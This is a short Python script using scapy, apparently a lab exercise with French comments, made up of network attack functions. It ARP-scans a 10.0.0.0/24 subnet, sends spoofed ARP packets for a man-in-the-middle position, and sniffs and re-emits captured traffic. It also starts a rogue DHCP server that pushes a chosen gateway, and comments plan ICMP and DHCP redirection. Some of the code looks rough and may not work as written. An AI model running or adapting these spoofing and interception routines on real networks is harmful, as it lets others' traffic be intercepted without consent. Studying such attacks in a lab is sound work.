from scapy import *
# from multiprocessing.pool import ThreadPool

def get_mac_from(ip_src, ip_dst):
    e=Ether(dst=ETHER_BROADCAST)/ARP(psrc=ip_src, pdst=ip_dst)
    return srp(e, timeout=1)

def send_arp_from(ip_src, ip_dst):
    e=Ether(dst=ETHER_BROADCAST)/ARP(psrc=ip_src, pdst=ip_dst)
    sendp(e, iface="veth0")

def mim(ip1, ip2):
    send_arp_from(ip1, ip2)
    send_arp_from(ip1, ip2)

def reemit(ip1, ip2):
    counter=0
    while 1 :
       if counter%5==0:
           mim(ip1,ip2)
       counter=counter+1
       packet=sniff(count=1)[0]
       if counter%2==0:
           packet.show()
       sendp(packet,iface="veth0")


def scan():
    addrs=["10.0.0."+str(i) for i in range(256)]
    packets=[Ether(dst=ETHER_BROADCAST)/ARP(pdst=addr) for addr in addrs]
    return srp(packets, timeout=1)
        
# def scan_multi_thread():
#     packets=[Ether(dst=ETHER_BROADCAST)/ARP(pdst=addr) for addr in addrs]
#     pool=ThreadPool(processes=50)
#     scan()

#mitm and icmp redirect a implementer

#dhcp redirect a implementer

#pool= addresses a donner, gw=route a utiliser?
def dhcp_serv():
    dhcpd(pool=["10.0.0.10"], network="10.0.0.0/24", gw="10.0.0.12")

if __name__=="__main__":
    scan()
